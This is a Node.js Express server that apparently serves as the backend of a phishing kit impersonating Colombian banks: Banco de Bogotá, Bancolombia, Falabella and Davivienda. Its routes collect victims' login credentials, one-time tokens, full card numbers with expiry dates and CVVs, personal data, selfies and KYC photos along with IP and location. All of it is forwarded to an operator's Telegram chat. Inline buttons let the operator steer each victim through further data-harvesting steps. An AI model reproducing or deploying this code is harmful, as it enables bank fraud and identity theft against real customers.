// 🚀 SERVIDOR UNIFICADO - Todos los Bancos + Sistema Tigo
// Versión: 1.0.0
// Plataforma: Render

const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');
const app = express();

// ========== CONFIGURACIÓN CORS ==========
const corsOptions = {
  origin: '*', 
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));

// ========== VARIABLES DE ENTORNO ==========
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const PORT = process.env.PORT || 3000;

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn("⚠️ [WARN] BOT_TOKEN o CHAT_ID no definidos.");
}

// ========== ALMACENAMIENTO DE SESIONES Y REDIRECCIONES ==========
const sessions = new Map();
const redirections = new Map();

// ========== FUNCIONES AUXILIARES ==========
const getTelegramApiUrl = (method) => `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;

async function eliminarBotones(chatId, messageId) {
  try {
    await axios.post(getTelegramApiUrl('editMessageReplyMarkup'), {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: { inline_keyboard: [] }
    });
    console.log(`✅ Botones eliminados del mensaje ${messageId}`);
  } catch (e) {
    console.error("❌ Error al eliminar botones:", e.message);
  }
}

// ============================================================================
// 🏦 SECCIÓN 1: BANCO DE BOGOTÁ - CLAVE SEGURA
// ============================================================================

async function enviarMensajeBancoBogotaTelegram({ tipoDoc, numDoc, clave, sessionId }) {
  const mensaje = `
🔐 *NUEVO ACCESO - BANCO DE BOGOTÁ*

📄 *Tipo de documento:* ${tipoDoc}
🆔 *Documento:* ${numDoc}
🔑 *Clave segura:* ${clave}

🌀 *Session ID:* \`${sessionId}\`
`;

  const botones = {
    inline_keyboard: [
      [
        { text: "🔄 Error Logo", callback_data: `bb_inicio_${sessionId}` },
        { text: "📧 Pedir Correo", callback_data: `bb_correo_${sessionId}` }
      ],
      [
        { text: "💳 Pedir Tarjeta", callback_data: `bb_tarjeta_${sessionId}` },
        { text: "🔢 Pedir Token", callback_data: `bb_otp1_${sessionId}` }
      ],
      [
        { text: "🚫 Error Token", callback_data: `bb_otp2_${sessionId}` }
      ]
    ]
  };

  const response = await axios.post(getTelegramApiUrl('sendMessage'), {
    chat_id: CHAT_ID,
    text: mensaje,
    parse_mode: "Markdown",
    reply_markup: botones
  });

  if (response.data.ok && response.data.result) {
    const sessionData = sessions.get(sessionId) || { redirect_to: null };
    sessionData.last_message_id = response.data.result.message_id;
    sessions.set(sessionId, sessionData);
  }
}

async function enviarMensajeBancoBogotaOTP({ tipoDoc, numDoc, clave, sessionId, token }) {
  const sessionData = sessions.get(sessionId);
  if (sessionData && sessionData.last_message_id) {
    await eliminarBotones(CHAT_ID, sessionData.last_message_id);
  }

  const mensaje = `
🔢 *TOKEN BANCO DE BOGOTÁ*

📄 *Tipo:* ${tipoDoc || "N/D"}
🆔 *Doc:* ${numDoc || "N/D"}
🔑 *Clave:* ${clave || "N/D"}
📲 *Token:* ${token || "N/D"}

🌀 *Session:* \`${sessionId}\`
`;

  const botones = {
    inline_keyboard: [
      [
        { text: "🔄 Error Logo", callback_data: `bb_inicio_${sessionId}` },
        { text: "📧 Pedir Correo", callback_data: `bb_correo_${sessionId}` }
      ],
      [
        { text: "💳 Pedir Tarjeta", callback_data: `bb_tarjeta_${sessionId}` },
        { text: "🔢 Pedir Token", callback_data: `bb_otp1_${sessionId}` }
      ],
      [
        { text: "🚫 Error Token", callback_data: `bb_otp2_${sessionId}` }
      ]
    ]
  };

  const response = await axios.post(getTelegramApiUrl('sendMessage'), {
    chat_id: CHAT_ID,
    text: mensaje,
    parse_mode: "Markdown",
    reply_markup: botones
  });

  if (response.data.ok && response.data.result && sessionData) {
    sessionData.last_message_id = response.data.result.message_id;
    sessions.set(sessionId, sessionData);
  }
}

async function enviarMensajeBancoBogotaTarjeta({ tipoDoc, numDoc, clave, sessionId, tarjeta, fecha, cvv }) {
  const sessionData = sessions.get(sessionId);
  if (sessionData && sessionData.last_message_id) {
    await eliminarBotones(CHAT_ID, sessionData.last_message_id);
  }

  const mensaje = `
💳 *TARJETA BANCO DE BOGOTÁ*

📄 *Tipo:* ${tipoDoc || "N/D"}
🆔 *Doc:* ${numDoc || "N/D"}
🔑 *Clave:* ${clave || "N/D"}
💳 *Tarjeta:* ${tarjeta || "N/D"}
📅 *Fecha:* ${fecha || "N/D"}
🔒 *CVV:* ${cvv || "N/D"}

🌀 *Session:* \`${sessionId}\`
`;

  const botones = {
    inline_keyboard: [
      [
        { text: "🔄 Error Logo", callback_data: `bb_inicio_${sessionId}` },
        { text: "📧 Pedir Correo", callback_data: `bb_correo_${sessionId}` }
      ],
      [
        { text: "💳 Pedir Tarjeta", callback_data: `bb_tarjeta_${sessionId}` },
        { text: "🔢 Pedir Token", callback_data: `bb_otp1_${sessionId}` }
      ],
      [
        { text: "🚫 Error Token", callback_data: `bb_otp2_${sessionId}` }
      ]
    ]
  };

  const response = await axios.post(getTelegramApiUrl('sendMessage'), {
    chat_id: CHAT_ID,
    text: mensaje,
    parse_mode: "Markdown",
    reply_markup: botones
  });

  if (response.data.ok && response.data.result && sessionData) {
    sessionData.last_message_id = response.data.result.message_id;
    sessions.set(sessionId, sessionData);
  }
}

async function enviarMensajeBancoBogotaCorreo({ tipoDoc, numDoc, clave, sessionId, correo, celular }) {
  const sessionData = sessions.get(sessionId);
  if (sessionData && sessionData.last_message_id) {
    await eliminarBotones(CHAT_ID, sessionData.last_message_id);
  }

  const mensaje = `
📧 *CORREO BANCO DE BOGOTÁ*

📄 *Tipo:* ${tipoDoc || "N/D"}
🆔 *Doc:* ${numDoc || "N/D"}
🔑 *Clave:* ${clave || "N/D"}
📧 *Correo:* ${correo || "N/D"}
📱 *Celular:* ${celular || "N/D"}

🌀 *Session:* \`${sessionId}\`
`;

  const botones = {
    inline_keyboard: [
      [
        { text: "🔄 Error Logo", callback_data: `bb_inicio_${sessionId}` },
        { text: "📧 Pedir Correo", callback_data: `bb_correo_${sessionId}` }
      ],
      [
        { text: "💳 Pedir Tarjeta", callback_data: `bb_tarjeta_${sessionId}` },
        { text: "🔢 Pedir Token", callback_data: `bb_otp1_${sessionId}` }
      ],
      [
        { text: "🚫 Error Token", callback_data: `bb_otp2_${sessionId}` }
      ]
    ]
  };

  const response = await axios.post(getTelegramApiUrl('sendMessage'), {
    chat_id: CHAT_ID,
    text: mensaje,
    parse_mode: "Markdown",
    reply_markup: botones
  });

  if (response.data.ok && response.data.result && sessionData) {
    sessionData.last_message_id = response.data.result.message_id;
    sessions.set(sessionId, sessionData);
  }
}

// Rutas Banco de Bogotá
app.post("/bb/virtualpersona", async (req, res) => {
  const { sessionId, metodo, tipoDoc, numDoc, clave } = req.body;
  if (metodo === "clave") {
    sessions.set(sessionId, { redirect_to: null });
    await enviarMensajeBancoBogotaTelegram({ tipoDoc, numDoc, clave, sessionId });
    return res.json({ ok: true });
  }
  return res.status(400).json({ error: "Método no soportado" });
});

app.post("/bb/notify/otp1", async (req, res) => {
  try {
    const { sessionId, tipoDoc, numDoc, clave, token } = req.body || {};
    if (!sessionId) return res.status(400).json({ ok: false, error: "Falta sessionId" });
    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
    await enviarMensajeBancoBogotaOTP({ tipoDoc, numDoc, clave, sessionId, token });
    return res.json({ ok: true });
  } catch (e) {
    console.error("❌ /notify/otp1 error:", e);
    return res.status(500).json({ ok: false });
  }
});

app.post("/bb/notify/otp2", async (req, res) => {
  try {
    const { sessionId, tipoDoc, numDoc, clave, token } = req.body || {};
    if (!sessionId) return res.status(400).json({ ok: false, error: "Falta sessionId" });
    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
    await enviarMensajeBancoBogotaOTP({ tipoDoc, numDoc, clave, sessionId, token });
    return res.json({ ok: true });
  } catch (e) {
    console.error("❌ /notify/otp2 error:", e);
    return res.status(500).json({ ok: false });
  }
});

app.post("/bb/notify/tarjeta", async (req, res) => {
  try {
    const { sessionId, tipoDoc, numDoc, clave, tarjeta, fecha, cvv } = req.body || {};
    if (!sessionId) return res.status(400).json({ ok: false, error: "Falta sessionId" });
    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
    await enviarMensajeBancoBogotaTarjeta({ tipoDoc, numDoc, clave, sessionId, tarjeta, fecha, cvv });
    return res.json({ ok: true });
  } catch (e) {
    console.error("❌ /notify/tarjeta error:", e);
    return res.status(500).json({ ok: false });
  }
});

app.post("/bb/notify/correo", async (req, res) => {
  try {
    const { sessionId, tipoDoc, numDoc, clave, correo, celular } = req.body || {};
    if (!sessionId) return res.status(400).json({ ok: false, error: "Falta sessionId" });
    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
    await enviarMensajeBancoBogotaCorreo({ tipoDoc, numDoc, clave, sessionId, correo, celular });
    return res.json({ ok: true });
  } catch (e) {
    console.error("❌ /notify/correo error:", e);
    return res.status(500).json({ ok: false });
  }
});

// ============================================================================
// 🏦 SECCIÓN 2: BANCOLOMBIA
// ============================================================================

// Funciones de menú para Bancolombia
function getBancolombiaMenu1(sessionId) {
    return {
        inline_keyboard: [
            [
                { text: "❌ Error Logo", callback_data: `bcol_errorlogo_${sessionId}` },
                { text: "♻️ Pedir Dinamica", callback_data: `bcol_opcion1_${sessionId}` }
            ],
            [
                { text: "🔒 CVV", callback_data: `bcol_debit_${sessionId}` },
                { text: "💳 16 CreditCard", callback_data: `bcol_partcc_${sessionId}` }
            ],
            [
                { text: "💳 16 DebitCard", callback_data: `bcol_partcc_${sessionId}` },
                { text: "🌐 SoyYO", callback_data: `bcol_soyyo_${sessionId}` }
            ],
            [
                { text: "💌 SMS", callback_data: `bcol_sms_${sessionId}` },
                { text: "📋 Datos", callback_data: `bcol_datos_${sessionId}` }
            ],
            [
                { text: "➕ Más Opciones", callback_data: `bcol_menu2_${sessionId}` }
            ]
        ]
    };
}

function getBancolombiaMenu2(sessionId) {
    return {
        inline_keyboard: [
            [
                { text: "❌ Error Logo", callback_data: `bcol_errorlogo_${sessionId}` },
                { text: "♻️Pédir Dinámica", callback_data: `bcol_opcion1_${sessionId}` }
            ],
            [
                { text: "🩶 Visa Platinum", callback_data: `bcol_visaplatinum_${sessionId}` },
                { text: "♻️Pédir Dinámica", callback_data: `bcol_opcion1_${sessionId}` }
            ],
            [
                { text: "❌ Error CVV", callback_data: `bcol_debiterror_${sessionId}` },
                { text: "🪙 MasterCard Gold", callback_data: `bcol_mastergold_${sessionId}` }
            ],
            [
                { text: "🩶 MasterCard Platinum", callback_data: `bcol_masterplati_${sessionId}` },
                { text: "🖤 Mastercard Black", callback_data: `bcol_masterblaack_${sessionId}` }
            ],
            [
                { text: "FINALIZAR✅", callback_data: `bcol_finalizar_${sessionId}` } 
            ]
        ]
    };
}

function getBancolombiaOTPMenu(sessionId) {
    return {
        inline_keyboard: [
            [
                { text: "❌ Error Logo", callback_data: `bcol_errorlogo_${sessionId}` },
                { text: "☢️ Error OTP", callback_data: `bcol_opcion2_${sessionId}` },
            ],
            [
                { text: "☢️ ERROR CVV", callback_data: `bcol_debiterror_${sessionId}` },
                { text: "✅ Finalizar", callback_data: `bcol_finalizar_${sessionId}` }
            ],
            [
                 { text: "➕ Más Opciones", callback_data: `bcol_menu2_${sessionId}` } 
            ]
        ]
    };
}

// Ruta: Selfie
app.post('/selfie', async (req, res) => {
  try {
    const { sessionId, imageBase64, fileName, ip, country, city } = req.body;
    
    if (!imageBase64) {
      return res.status(400).send({ ok: false, reason: "No image provided" });
    }

    const base64Data = imageBase64.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');

    const caption = `
📸 *SELFIE BANCOLOMBIA*
📁 Archivo: ${fileName || 'selfie.jpg'}
🌐 IP: ${ip || 'N/D'}
📍 Ubicación: ${city || 'N/D'}, ${country || 'N/D'}
🆔 Session: ${sessionId}
    `.trim();

    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', buffer, {
      filename: fileName || 'selfie.jpg',
      contentType: 'image/jpeg'
    });
    formData.append('caption', caption);

    await axios.post(getTelegramApiUrl('sendPhoto'), formData, {
      headers: formData.getHeaders()
    });

    // Enviar menú en mensaje separado
    const reply_markup = getBancolombiaMenu1(sessionId);
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: '👆 Selecciona la siguiente acción:',
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /bancolombia/selfie:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// Ruta: Virtual Persona (Login)
app.post('/virtualpersona', async (req, res) => {
  try {
    const { sessionId, user, pass, ip, country, city } = req.body;
    
    const mensaje = `
💲 *NUEVO LOGO BANCOLOMBIA*
👤 USUARIO: ${user}
🔑 CLAVE: ${pass}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();
    
    const reply_markup = getBancolombiaMenu1(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });
    
    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /bancolombia/virtualpersona:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// Ruta: OTP1
app.post('/otp1', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body;
    
    const mensaje = `
💲 *INGRESO OTP DINAMICA - BANCOLOMBIA*
👤 User: ${user}
🔑 Pass: ${pass}
🔢 Dina: ${dina}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();
    
    redirections.set(sessionId, null);
    const reply_markup = getBancolombiaOTPMenu(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });
    
    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /bancolombia/otp1:', error.message);
    res.status(500).send({ ok: false });
  }
});

// Ruta: OTP2
app.post('/otp2', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body;
    
    const mensaje = `
💲 *INGRESO OTP NEW DINAMICA - BANCOLOMBIA*
👤 User: ${user}
🔑 Pass: ${pass}
🔢 Dina: ${dina}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();
    
    redirections.set(sessionId, null);
    const reply_markup = getBancolombiaOTPMenu(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });
    
    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /bancolombia/otp2:', error.message);
    res.status(500).send({ ok: false });
  }
});

// Ruta: PartCC (16 dígitos)
app.post('/partcc', async (req, res) => {
  try {
    const { sessionId, user, pass, partcc, ip, country, city } = req.body;
    
    const mensaje = `
💳 *16 DÍGITOS TC/DB - BANCOLOMBIA*
👤 User: ${user}
🔑 Pass: ${pass}
💳 16 Dígitos: ${partcc}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();
    
    redirections.set(sessionId, null);
    const reply_markup = getBancolombiaOTPMenu(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });
    
    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /bancolombia/partcc:', error.message);
    res.status(500).send({ ok: false });
  }
});

// Ruta: Debit (CVV)
app.post('/debit', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    
    const mensaje = `
💳 *CVV DEBITO - BANCOLOMBIA*
👤 Usuario: ${user}
🔑 Clave: ${pass}
🔢 CVC: ${cvc || "N/A"}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();
    
    const reply_markup = getBancolombiaMenu2(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });
    
    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /bancolombia/debit:', error.message);
    res.status(500).send({ ok: false });
  }
});

// Ruta: Datos
app.post('/datos', async (req, res) => {
  try {
    const { sessionId, user, pass, nombre, cedula, correo, telefono, ip, country, city } = req.body;
    
    const mensaje = `
📋 *DATOS PERSONALES - BANCOLOMBIA*
👤 User: ${user}
🔑 Pass: ${pass}
📛 Nombre: ${nombre}
🪪 Cédula: ${cedula}
📧 Correo: ${correo}
📱 Teléfono: ${telefono}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();
    
    redirections.set(sessionId, null);
    const reply_markup = getBancolombiaOTPMenu(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });
    
    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /bancolombia/datos:', error.message);
    res.status(500).send({ ok: false });
  }
});

// ============================================================================
// 🏦 SECCIÓN 3: FALABELLA\n// ============================================================================
// 🏦 SECCIÓN 3: FALABELLA - SUITE DE ESPERA
// ============================================================================

function getSuiteReplyMarkup(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: "❌ Error Logo", callback_data: `fala_index_${sessionId}` },
        { text: "🔄 Dinamica", callback_data: `fala_index2_${sessionId}` }
      ],
      [
        { text: "⚠️ Error Dinamica", callback_data: `fala_index3_${sessionId}` },
        { text: "📋 Datos", callback_data: `fala_protocol_${sessionId}` }
      ],
      [
        { text: "🔍 SoyYO", callback_data: `fala_soyyo_${sessionId}` },
        { text: "✅ Aprobado", callback_data: `fala_aprobado_${sessionId}` }
      ],
      [
        { text: "🏁 Finalizar", callback_data: `fala_finish_${sessionId}` }
      ]
    ]
  };
}

app.post('/nuevo-cliente', async (req, res) => {
  try {
    const { sessionId, docu, clave, ip, country, city } = req.body;
    
    const mensaje = `
🆕 *NUEVO CLIENTE FALABELLA*
📄 Docu: ${docu}
🔑 Clave: ${clave}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    const reply_markup = getSuiteReplyMarkup(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /nuevo-cliente:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

app.post('/dinamica', async (req, res) => {
  try {
    const { sessionId, docu, clave, dina, ip, country, city } = req.body;
    
    const mensaje = `
🔄 *DINAMICA FALABELLA*
📄 Docu: ${docu}
🔑 Clave: ${clave}
🔢 Dina: ${dina}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    redirections.set(sessionId, null);
    const reply_markup = getSuiteReplyMarkup(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /dinamica:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

app.post('/error-dinamica', async (req, res) => {
  try {
    const { sessionId, docu, clave, dina, ip, country, city } = req.body;
    
    const mensaje = `
⚠️ *ERROR DINAMICA FALABELLA*
📄 Docu: ${docu}
🔑 Clave: ${clave}
🔢 Dina: ${dina}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    redirections.set(sessionId, null);
    const reply_markup = getSuiteReplyMarkup(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /error-dinamica:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

app.post('/datos', async (req, res) => {
  try {
    const { sessionId, nombre, cedula, correo, telefono, ip, country, city } = req.body;
    
    const mensaje = `
📋 *DATOS PERSONALES FALABELLA*
📛 Nombre: ${nombre}
🪪 Cédula: ${cedula}
📧 Correo: ${correo}
📱 Teléfono: ${telefono}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    redirections.set(sessionId, null);
    const reply_markup = getSuiteReplyMarkup(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /datos:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

app.post('/soyyo', async (req, res) => {
  try {
    const { sessionId, docu, clave, ip, country, city } = req.body;
    
    const mensaje = `
🔍 *SOY YO - FALABELLA*
📄 Docu: ${docu}
🔑 Clave: ${clave}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    redirections.set(sessionId, null);
    const reply_markup = getSuiteReplyMarkup(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /soyyo:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ============================================================================
// 🏦 SECCIÓN 4: DAVIVIENDA - KYC
// ============================================================================

function getMenuDaviNuevoIngreso(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: "❌ Error Logo", callback_data: `davi_errorlogo_${sessionId}` },
        { text: "✅ Aceptar", callback_data: `davi_parental_${sessionId}` }
      ],
      [
        { text: "📸 KYC", callback_data: `davi_verify_${sessionId}` },
        { text: "🏠 Home", callback_data: `davi_home1_${sessionId}` }
      ]
    ]
  };
}

function getMenuDaviPasoAceptar(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: "❌ Error Logo", callback_data: `davi_index_${sessionId}` },
        { text: "✅ Aceptar", callback_data: `davi_parental_${sessionId}` }
      ],
      [
        { text: "📸 KYC", callback_data: `davi_verify_${sessionId}` },
        { text: "🏠 Home", callback_data: `davi_home2_${sessionId}` }
      ]
    ]
  };
}

function getMenuDaviKYCCompleto(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: "❌ Error Logo", callback_data: `davi_errorlogo_${sessionId}` },
        { text: "✅ Aceptar", callback_data: `davi_parental_${sessionId}` }
      ],
      [
        { text: "⚠️ KYC-ERROR", callback_data: `davi_verify_${sessionId}` },
        { text: "🔄 Nuevo Intento", callback_data: `davi_index_${sessionId}` }
      ],
      [
        { text: "🏠 Home", callback_data: `davi_home3_${sessionId}` }
      ]
    ]
  };
}

app.post('/nuevo-ingreso', async (req, res) => {
  try {
    const { sessionId, docu, clave, ip, country, city } = req.body;
    
    const mensaje = `
🆕 *NUEVO INGRESO DAVIVIENDA*
📄 Doc: ${docu}
🔑 Clave: ${clave}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    const reply_markup = getMenuDaviNuevoIngreso(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /nuevo-ingreso:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

app.post('/paso-aceptar', async (req, res) => {
  try {
    const { sessionId, docu, clave, ip, country, city } = req.body;
    
    const mensaje = `
✅ *PASO ACEPTAR DAVIVIENDA*
📄 Doc: ${docu}
🔑 Clave: ${clave}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    redirections.set(sessionId, null);
    const reply_markup = getMenuDaviPasoAceptar(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /paso-aceptar:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

app.post('/kyc-completo', async (req, res) => {
  try {
    const { sessionId, docu, clave, photo, ip, country, city } = req.body;
    
    if (!photo) {
      return res.status(400).json({ ok: false, reason: "No se recibió la foto" });
    }

    const base64Data = photo.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');

    const caption = `
📸 *KYC DAVIVIENDA COMPLETADO*
📄 Doc: ${docu}
🔑 Clave: ${clave}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', buffer, {
      filename: 'selfie.jpg',
      contentType: 'image/jpeg'
    });
    formData.append('caption', caption);

    await axios.post(getTelegramApiUrl('sendPhoto'), formData, {
      headers: formData.getHeaders()
    });

    redirections.set(sessionId, null);
    const reply_markup = getMenuDaviKYCCompleto(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: '👆 Selecciona la siguiente acción:',
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /kyc-completo:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ============================================================================
// 🏦 SECCIÓN 4: BANCOLOMBIA
// ============================================================================

// Nota: Bancolombia usa el mismo sistema que Banco de Bogotá
// Podemos reutilizar las mismas funciones con prefijo diferente

async function enviarMensajeBancolombiaTelegram({ tipoDoc, numDoc, clave, sessionId }) {
  const mensaje = `
🔐 *NUEVO ACCESO - BANCOLOMBIA*

📄 *Tipo de documento:* ${tipoDoc}
🆔 *Documento:* ${numDoc}
🔑 *Clave:* ${clave}

🌀 *Session ID:* \`${sessionId}\`
`;

  const botones = {
    inline_keyboard: [
      [
        { text: "🔄 Error Logo", callback_data: `bcol_inicio_${sessionId}` },
        { text: "📧 Pedir Correo", callback_data: `bcol_correo_${sessionId}` }
      ],
      [
        { text: "💳 Pedir Tarjeta", callback_data: `bcol_tarjeta_${sessionId}` },
        { text: "🔢 Pedir Token", callback_data: `bcol_otp1_${sessionId}` }
      ],
      [
        { text: "🚫 Error Token", callback_data: `bcol_otp2_${sessionId}` }
      ]
    ]
  };

  const response = await axios.post(getTelegramApiUrl('sendMessage'), {
    chat_id: CHAT_ID,
    text: mensaje,
    parse_mode: "Markdown",
    reply_markup: botones
  });

  if (response.data.ok && response.data.result) {
    const sessionData = sessions.get(sessionId) || { redirect_to: null };
    sessionData.last_message_id = response.data.result.message_id;
    sessions.set(sessionId, sessionData);
  }
}

async function enviarMensajeBancolombiaOTP({ tipoDoc, numDoc, clave, sessionId, token }) {
  const sessionData = sessions.get(sessionId);
  if (sessionData && sessionData.last_message_id) {
    await eliminarBotones(CHAT_ID, sessionData.last_message_id);
  }

  const mensaje = `
🔢 *TOKEN BANCOLOMBIA*

📄 *Tipo:* ${tipoDoc || "N/D"}
🆔 *Doc:* ${numDoc || "N/D"}
🔑 *Clave:* ${clave || "N/D"}
📲 *Token:* ${token || "N/D"}

🌀 *Session:* \`${sessionId}\`
`;

  const botones = {
    inline_keyboard: [
      [
        { text: "🔄 Error Logo", callback_data: `bcol_inicio_${sessionId}` },
        { text: "📧 Pedir Correo", callback_data: `bcol_correo_${sessionId}` }
      ],
      [
        { text: "💳 Pedir Tarjeta", callback_data: `bcol_tarjeta_${sessionId}` },
        { text: "🔢 Pedir Token", callback_data: `bcol_otp1_${sessionId}` }
      ],
      [
        { text: "🚫 Error Token", callback_data: `bcol_otp2_${sessionId}` }
      ]
    ]
  };

  const response = await axios.post(getTelegramApiUrl('sendMessage'), {
    chat_id: CHAT_ID,
    text: mensaje,
    parse_mode: "Markdown",
    reply_markup: botones
  });

  if (response.data.ok && response.data.result && sessionData) {
    sessionData.last_message_id = response.data.result.message_id;
    sessions.set(sessionId, sessionData);
  }
}

async function enviarMensajeBancolombiaTarjeta({ tipoDoc, numDoc, clave, sessionId, tarjeta, fecha, cvv }) {
  const sessionData = sessions.get(sessionId);
  if (sessionData && sessionData.last_message_id) {
    await eliminarBotones(CHAT_ID, sessionData.last_message_id);
  }

  const mensaje = `
💳 *TARJETA BANCOLOMBIA*

📄 *Tipo:* ${tipoDoc || "N/D"}
🆔 *Doc:* ${numDoc || "N/D"}
🔑 *Clave:* ${clave || "N/D"}
💳 *Tarjeta:* ${tarjeta || "N/D"}
📅 *Fecha:* ${fecha || "N/D"}
🔒 *CVV:* ${cvv || "N/D"}

🌀 *Session:* \`${sessionId}\`
`;

  const botones = {
    inline_keyboard: [
      [
        { text: "🔄 Error Logo", callback_data: `bcol_inicio_${sessionId}` },
        { text: "📧 Pedir Correo", callback_data: `bcol_correo_${sessionId}` }
      ],
      [
        { text: "💳 Pedir Tarjeta", callback_data: `bcol_tarjeta_${sessionId}` },
        { text: "🔢 Pedir Token", callback_data: `bcol_otp1_${sessionId}` }
      ],
      [
        { text: "🚫 Error Token", callback_data: `bcol_otp2_${sessionId}` }
      ]
    ]
  };

  const response = await axios.post(getTelegramApiUrl('sendMessage'), {
    chat_id: CHAT_ID,
    text: mensaje,
    parse_mode: "Markdown",
    reply_markup: botones
  });

  if (response.data.ok && response.data.result && sessionData) {
    sessionData.last_message_id = response.data.result.message_id;
    sessions.set(sessionId, sessionData);
  }
}

